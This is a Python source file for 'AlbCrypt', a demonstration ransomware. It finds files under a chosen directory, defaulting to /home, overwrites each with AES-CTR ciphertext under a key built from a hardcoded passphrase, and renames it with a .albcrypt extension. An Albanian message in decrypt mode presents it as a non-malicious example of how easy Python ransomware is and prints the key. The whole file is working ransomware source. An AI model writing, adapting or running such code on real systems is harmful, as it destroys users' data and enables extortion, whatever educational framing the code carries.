import pyaes
import os
import argparse
import hashlib

import recon
import recon_dec
import ascii_artwork


#hardcoded key to decrypt files
hardcoded_passphrase = "albanian submarine"


#function to encrypt found files
def encrypt_files(file_name, key):

    aes = pyaes.AESModeOfOperationCTR(key)
    for file in file_name:
        with open(file, 'rb') as (fo):
            plaintext = fo.read()
        enc = aes.encrypt(plaintext)
        with open(file, 'wb') as (fo):
            fo.write(enc)
        os.rename(file, file + '.albcrypt')
        print(ascii_artwork.ascii_artwork_enc)


#function to decrypt files
def decrypt_files(file_name, key):

    aes = pyaes.AESModeOfOperationCTR(key)
    for file in file_name:
        with open(file, 'rb') as (fo):
            plaintext = fo.read()
        dec = aes.decrypt(plaintext)
        with open(file, 'wb') as (fo):
            fo.write(dec)
        os.rename(file, file[:-9])
        print(ascii_artwork.ascii_artwork_dec)


#function to parse decrypt option
def get_parser():

    parser = argparse.ArgumentParser(description='AlbCrypt')
    parser.add_argument('-d', '--decrypt', help='decrypt files [default: no]',
                        action="store_true")
    parser.add_argument('-p', '--startpath', type=lambda x: is_valid_directory(parser, x), help='specify target path [default: /home]')
    return parser

def is_valid_directory(parser, arg):
    if not os.path.isdir(arg):
        parser.error(f'The directory {arg} does not exist')
    else:
        return arg


def main():
    
    parser  = get_parser()
    args    = vars(parser.parse_args())
    decrypt = args['decrypt']
    startpath = args['startpath']

    key = hashlib.md5(hardcoded_passphrase.encode('utf-8')).hexdigest()
    key = key.encode('utf-8')

    if decrypt:
        print (f'''
AlbCrypt!
---------------
FILET TUAJA JANE ENKRIPTUAR! Kjo eshte pjesa kur zakonisht kriminelet kibernetik
kerkojne nje pagese ne kriptovalute per te derguar celesin e dekriptimit ne menyre 
qe ju te rikuperoni filet tuaja. Ky eshte nje shembull i thjeshte per te treguar 
se sa e lehte eshte te ndertosh nje ransomware ne python.

Ky projekt nuk ka synim te perdoret per qellime dashakeqe. Celesi i dekriptimit
gjendet me poshte. Sigurohuni qe ta shkruani sakte celesin, ndryshe rrezikoni te 
humbisni filet tuaja pergjithmone. Mos perfshini thonjezat ne celesin e dekriptimit.
Dekriptim te mbare!

Celesi i dekriptimit eshte: {hardcoded_passphrase}
''')
        passphrase = input('VENDOS CELESIN KETU: ')

        if passphrase == hardcoded_passphrase:
            decrypt_files(recon_dec.get_encrypted_files(startpath), key)
        else:
            print("Your decryption key is incorrect!")
        exit()

    else:
        if hardcoded_passphrase:
            passphrase = hardcoded_passphrase
    
    if startpath:
        encrypt_files(recon.get_files(startpath), key)
    else:
        encrypt_files(recon.get_files('/home'), key)

if __name__=="__main__":
    main()
